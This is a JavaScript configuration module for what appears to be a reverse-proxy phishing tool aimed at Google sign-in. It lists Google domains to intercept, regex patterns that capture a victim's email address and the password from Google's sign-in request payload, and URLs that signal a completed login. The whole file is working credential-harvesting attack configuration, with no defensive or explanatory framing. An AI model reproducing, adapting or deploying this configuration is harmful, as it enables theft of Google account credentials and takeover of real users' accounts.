module.exports = {
  name: 'google',
  target_url: 'https://accounts.google.com',
  intercept_urls: [
    '*://accounts.google.com/*',
    '*://play.google.com/*',
    '*://*.google.com/*',
    '*://www.gstatic.com/*'
  ],
  capture_fields: {
    email: {
      key: 'email',
      search: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g,
      type: 'response'
    },
    password: {
      key: 'password',
      search: /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C\d%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/,
      type: 'request'
    }
  },
  auth_urls: [
    '/myaccount/home',
    '/myaccount.google.com'
  ],
  login: {
    domain: 'accounts.google.com',
    path: '/signin'
  }
};